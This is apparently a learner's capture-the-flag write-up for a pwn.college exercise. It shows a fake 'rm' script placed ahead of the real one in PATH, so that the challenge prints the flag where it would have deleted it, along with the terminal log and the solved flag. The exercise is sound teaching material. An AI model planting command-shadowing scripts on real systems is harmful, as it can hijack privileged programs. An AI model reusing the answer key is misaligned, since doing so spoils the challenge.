# Hijacking commands 

In this challenge will delete the flag using the rm command. But unlike before, it will not print anything out for us.

## My solve
**Flag:** `pwn.college{cNQVwyklcDFDP_n-ggC92aEK0zb.QX3cjM1wiM1kjNzEzW}`

As given in the challenge we need to stop the removal of flag but we cannon use PATH rm to stop it, as we won't get the flag.
Now what I did was to create a fake directory named /tmp/flag and put the commands into /tmp/fake/rm then I added execute permission
to it and exported PATH=/tmp/fake:$PATH. Used which rm to check the directories of rm. Finally ran /challenge/run to get the flag.

```
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
Found 'rm' command at /run/dojo/bin/rm. Executing!
Uh oh, looks like I successfully removed the flag! That means you did not 
properly set PATH to keep me from finding 'rm'. Since the flag is gone, you 
will need to re-launch the challenge from the module page! Better luck next 
time.
hacker@path~hijacking-commands:~$ mkdir -p /tmp/fake
hacker@path~hijacking-commands:~$ echo '#!/bin/bash' > /tmp/fake/rm
hacker@path~hijacking-commands:~$ echo 'cat "${!#}"' >> /tmp/fake/rm
hacker@path~hijacking-commands:~$ chmod +x /tmp/fake/rm
hacker@path~hijacking-commands:~$ export PATH=/tmp/fake:$PATH
hacker@path~hijacking-commands:~$ which rm
/tmp/fake/rm
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
Found 'rm' command at /tmp/fake/rm. Executing!
pwn.college{cNQVwyklcDFDP_n-ggC92aEK0zb.QX3cjM1wiM1kjNzEzW}
```

## What I learned

Learnt nothing new but this problem is very good for revision of previous concepts.

## References 
None.
